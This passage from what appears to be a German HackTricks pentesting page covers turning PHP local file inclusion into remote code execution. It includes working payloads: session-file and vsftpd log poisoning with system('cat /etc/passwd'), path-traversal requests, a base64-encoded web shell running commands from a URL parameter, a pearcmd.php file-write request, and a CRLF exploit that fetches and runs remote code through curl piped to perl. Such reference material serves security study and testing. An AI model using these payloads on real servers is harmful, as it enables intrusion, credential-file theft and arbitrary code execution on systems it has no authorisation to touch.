Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
In PHP werden diese sessions in _/var/lib/php5/sess\\_\[PHPSESSID]\_ Dateien gespeichert
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Setze das Cookie auf `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Nutze LFI, um die PHP-Session-Datei einzubinden.
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Über ssh

Wenn ssh aktiv ist, prüfe, welcher Benutzer verwendet wird (/proc/self/status & /etc/passwd) und versuche auf **\<HOME>/.ssh/id_rsa** zuzugreifen.

### **Über** **vsftpd** _**Protokolle**_

Die Protokolle des FTP-Servers vsftpd befinden sich unter _**/var/log/vsftpd.log**_. In dem Szenario, in dem eine Local File Inclusion (LFI)-Schwachstelle vorhanden ist und Zugriff auf einen exponierten vsftpd-Server möglich ist, können die folgenden Schritte in Betracht gezogen werden:

1. Injiziere eine PHP-Payload in das Benutzername-Feld während des Anmeldevorgangs.
2. Nach der Injection nutze die LFI, um die Server-Protokolle aus _**/var/log/vsftpd.log**_ auszulesen.

### Über php base64 filter (using base64)

Wie in [diesem](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) Artikel gezeigt, ignoriert der PHP base64 filter einfach Nicht-Base64. Du kannst das nutzen, um die Dateiendungsprüfung zu umgehen: wenn du Base64 lieferst, das mit ".php" endet, würde er einfach den "." ignorieren und "php" an das Base64 anhängen. Hier ist ein Beispiel-Payload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Über php filters (keine Datei nötig)

Dieses [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) erklärt, dass du **php filters** verwenden kannst, um beliebigen Inhalt als Ausgabe zu erzeugen. Das bedeutet im Grunde, dass du beliebigen php code für das include erzeugen kannst, ohne ihn in eine Datei schreiben zu müssen.


{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### Über segmentation fault

**Upload** eine Datei, die als **temporary** in `/tmp` gespeichert wird, löse dann in derselben **same request** einen **segmentation fault** aus — danach wird die **temporary file won't be deleted** und du kannst nach ihr suchen.


{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Über Nginx temp file storage

Wenn du eine **Local File Inclusion** gefunden hast und **Nginx** vor PHP läuft, könntest du mit der folgenden Technik RCE erlangen:


{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### Über PHP_SESSION_UPLOAD_PROGRESS

Wenn du eine **Local File Inclusion** gefunden hast, selbst wenn du **don't have a session** und `session.auto_start` auf `Off` steht. Wenn du den **`PHP_SESSION_UPLOAD_PROGRESS`** in **multipart POST**-Daten angibst, wird PHP die **enable the session for you**. Du könntest dies missbrauchen, um RCE zu erreichen:


{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Über temp file uploads in Windows

Wenn du eine **Local File Inclusion** gefunden hast und der Server unter **Windows** läuft, könntest du RCE erhalten:


{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### Über `pearcmd.php` + URL args

As [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), das Script `/usr/local/lib/phppearcmd.php` existiert standardmäßig in php docker images. Außerdem ist es möglich, dem Script Argumente über die URL zu übergeben, weil angegeben ist, dass ein URL-Param ohne `=` als Argument verwendet werden sollte. Siehe auch [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) und [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/).

Die folgende Anfrage erstellt eine Datei in `/tmp/hello.php` mit dem Inhalt `<?=phpinfo()?>`:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
Im Folgenden wird eine CRLF vuln ausgenutzt, um RCE zu erlangen (von [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### Über phpinfo() (file_uploads = on)

Wenn du eine **Local File Inclusion** und eine Datei gefunden hast, die **phpinfo()** mit file_uploads = on exponiert, kannst du RCE erhalten:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### Über compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

Wenn du eine **Local File Inclusion** gefunden hast und du den Pfad der temporären Datei **exfiltrieren** kannst, ABER der **Server** überprüft, ob die **einzuschließende Datei PHP-Marker** enthält, kannst du versuchen, diese Überprüfung mit dieser **Race Condition** zu umgehen:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### Über eternal waiting + bruteforce

Wenn du die LFI missbrauchen kannst, um **temporäre Dateien hochzuladen** und den Server die PHP-Ausführung **aufhängen** zu lassen, könntest du anschließend stundenlang Dateinamen per **bruteforce** ausprobieren, um die temporäre Datei zu finden:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### Zu einem Fatal Error

Wenn du eine der Dateien `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar` einbindest. (Du musst dieselbe Datei zweimal einbinden, um diesen Fehler auszulösen).

**Ich weiß nicht, wie das nützlich ist, aber es könnte sein.**\
_Even if you cause a PHP Fatal Error, PHP temporary files uploaded are deleted._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>


## Referenzen

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
